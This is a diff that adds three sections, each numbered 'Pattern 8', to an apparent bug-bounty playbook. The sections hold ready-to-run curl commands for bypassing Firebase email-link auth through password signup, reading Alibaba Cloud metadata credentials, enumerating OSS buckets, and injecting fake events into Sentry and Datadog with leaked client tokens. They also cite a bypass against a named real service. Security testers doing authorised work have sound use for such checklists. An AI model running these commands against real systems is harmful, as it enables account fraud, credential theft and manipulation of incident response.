@@ -111,6 +111,102 @@ curl -sk "https://<target>:6443/api/v1/pods" | head -20
 ```
 **Impact:** Critical — unauthenticated K8s API = full cluster compromise
 
+## Pattern 8: Firebase Auth Provider Bypass
+
+**Hit rate:** Medium-high — apps using email-link/phone auth often leave password auth enabled
+**Check:**
+```bash
+# Extract API key from page source / JS bundles (look for firebaseConfig)
+# Then test password signup (MUST include Referer header):
+curl -sk -H "Referer: https://TARGET/" \
+  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"email":"test@attacker.com","password":"Test123!","returnSecureToken":true}'
+# VULN if: returns {"idToken":"eyJ..."} — password signup works when app only uses emailLink
+
+# Decode JWT to confirm:
+echo "$TOKEN" | cut -d. -f2 | base64 -d | python3 -m json.tool
+# Check: firebase.sign_in_provider should be "password" (bypasses intended "emailLink" flow)
+```
+**Impact:** Medium-High — auth flow bypass, account squatting, KYC bypass on regulated platforms (gambling, finance). On WinTicket (June 2026): password signUp returned valid JWT while app exclusively uses email-link auth. Combined with `/v1/auth/email` accepting the token (HTTP 204) = full registration bypass.
+
+---
+
+## Pattern 8: Alibaba Cloud (Aliyun) Infrastructure
+
+**Hit rate:** Medium — common for Ant Group, Alipay, and SEA fintech targets
+**Fingerprints:**
+```bash
+# Headers that confirm Alibaba Cloud
+curl -sI https://target.com | grep -iE '(x-oss|x-fc|server: Tengine|server: Spanner|server: ESA|via: ispanner|via: ens-cache)'
+# DNS
+dig +short CNAME target.com  # *.w.cdngslb.com (CDN), *.alipaydns.com (Ant DNS)
+```
+
+**Metadata endpoint (different from AWS!):**
+```bash
+# Alibaba Cloud uses 100.100.100.200, NOT 169.254.169.254
+curl http://100.100.100.200/latest/meta-data/
+curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
+```
+
+**OSS bucket enumeration:**
+```bash
+# Regions: oss-ap-southeast-1, oss-cn-hangzhou, oss-cn-shanghai
+for region in oss-ap-southeast-1 oss-cn-hangzhou oss-cn-shanghai; do
+  curl -s "https://${BUCKET}.${region}.aliyuncs.com/" | head -5
+done
+# Also test via CNAME (may have different ACL)
+# OSS POST → XML MethodNotAllowed + webapp-origin.marmot-cloud.com = dead end (static CDN)
+```
+
+**Function Compute:**
+```bash
+# x-fc-request-id header = Alibaba FC
+# POST /invoke may return internal errors (HTTP 599)
+curl -sk -X POST -H 'Content-Type: application/json' -d '{}' 'https://target.com/invoke'
+# "PackInfoNotInitError" = broken/uninitialized function (not exploitable, info-level)
+```
+
+**Container Registry:**
+```bash
+# Alibaba Container Registry (ACR)
+curl -sk "https://registry-intl.ap-southeast-1.aliyuncs.com/${NAMESPACE}/"
+```
+
+**Impact:** Varies — OSS listing (Low-Medium), metadata SSRF (Critical), FC code exec (Critical)
+
+---
+
+## Pattern 8: Third-Party Service Token Abuse (Sentry/Datadog/Braze)
+
+**Hit rate:** High — client-side tokens for observability/push services often have write access
+**Check:**
+```bash
+# Extract tokens from JS bundles / HTML config
+grep -oE 'SENTRY_DSN.*?"|DD_CLIENT_TOKEN.*?"|BRAZE_API_KEY.*?"' source.js
+
+# Sentry DSN write test
+curl -sk -X POST "https://<org>.ingest.sentry.io/api/<project>/store/" \
+  -H "Content-Type: application/json" \
+  -H "X-Sentry-Auth: Sentry sentry_version=7, sentry_key=<key>" \
+  -d '{"event_id":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","message":"test","level":"info","platform":"javascript"}'
+# 200 + event_id = write access confirmed
+
+# Datadog RUM injection
+curl -sk -X POST "https://browser-intake-datadoghq.com/api/v2/rum?dd-api-key=<client_token>&dd-evp-origin=browser&dd-request-id=test" \
+  -H "Content-Type: text/plain" \
+  -d '{"application":{"id":"<app_id>"},"session":{"id":"test"},"view":{"id":"test"},"type":"error","error":{"message":"injected","source":"custom"}}'
+# 202 = write access confirmed
+
+# Datadog Logs injection
+curl -sk -X POST "https://browser-intake-datadoghq.com/api/v2/logs?dd-api-key=<client_token>&dd-evp-origin=browser" \
+  -H "Content-Type: text/plain" \
+  -d '[{"message":"injected log","status":"error","service":"target-service"}]'
+# 202 = write access confirmed
+```
+**Impact:** Low standalone (monitoring pollution, alert fatigue). Chain with social engineering for Medium (fake critical alerts → incident response manipulation). Report as monitoring infrastructure write access.
+
 ---
 
 ## When to Add New Patterns
